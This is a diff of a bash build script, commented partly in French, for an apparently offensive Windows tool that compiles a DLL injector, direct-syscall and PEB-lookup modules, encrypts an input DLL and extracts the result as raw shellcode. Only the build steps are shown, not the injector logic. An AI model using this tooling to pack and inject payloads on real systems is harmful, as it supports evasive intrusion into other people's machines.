@@ -10,17 +10,17 @@ mkdir build
 echo assembling src/utils/direct-syscalls.asm
 nasm -f win64 src/utils/direct-syscalls.asm -o build/direct-syscalls.o
 
-echo assembling src/asm-stub.asm
-nasm -f bin src/asm-stub.asm -o build/asm-stub.bin
-
-echo building the header file for asm-stub.asm
-xxd -i build/asm-stub.bin > include/asm-stub-bin.h
-echo -e "DOT_TEXT\n$(cat include/asm-stub-bin.h)" > include/asm-stub-bin.h
+# pas encore au point, le asm-stub.asm est hard codé dans le fichier c
+# echo assembling src/asm-stub.asm
+# nasm -f bin src/asm-stub.asm -o build/asm-stub.bin
+# echo building the header file for asm-stub.asm
+# xxd -i build/asm-stub.bin > include/asm-stub-bin.h
+# echo -e "DOT_TEXT\n$(cat include/asm-stub-bin.h)" > include/asm-stub-bin.h
 
 echo compiling c files
 
 echo src/utils/memory.c
-x86_64-w64-mingw32-gcc -Iinclude -c src/utils/memory.c -o build/memory.o -Os -ffreestanding -nostdlib 
+x86_64-w64-mingw32-gcc -Iinclude -c src/utils/memory.c -o build/memory.o -Os -ffreestanding -nostdlib
 
 echo src/utils/peb-lookup.c
 x86_64-w64-mingw32-gcc -Iinclude -c src/utils/peb-lookup.c -o build/peb-lookup.o -Os -ffreestanding -nostdlib
@@ -38,18 +38,19 @@ echo building the main.c file from the template
 python src/encrypt.py $INPUT_DLL
 x86_64-w64-mingw32-gcc -Iinclude -c build/main.c -o build/main.o -Os -ffreestanding -nostdlib
 rm build/main.c
-rm include/asm-stub-bin.h
-rm build/asm-stub.bin
 
 OBJ_FILES=($(ls build/*))
 
 echo linking "${OBJ_FILES[*]}"
-x86_64-w64-mingw32-ld ${OBJ_FILES[*]} -o build/combined.o -e WinMain -nostdlib
-echo extracting the shellcode
-# x86_64-w64-mingw32-gcc -o build/shellcode.exe ${OBJ_FILES[*]} -Wl,--omagic \
+x86_64-w64-mingw32-ld build/main.o build/dll-injector.o build/pe-parser.o build/direct-syscalls.o build/loader-stub.o build/memory.o build/peb-lookup.o -o build/combined.o -nostdlib
+
+
+# pour un exécutable autonome
+# x86_64-w64-mingw32-gcc -o build/shellcode.exe build/combined.o -Wl,--omagic \
 #   -Wl,--disable-nxcompat \
 #   -Wl,--disable-dynamicbase \
-#   -lkernel32 -mconsole
+#   -lkernel32
   
+echo extracting the shellcode
 x86_64-w64-mingw32-objcopy -O binary --only-section=.text build/combined.o build/shellcode.bin
 echo done
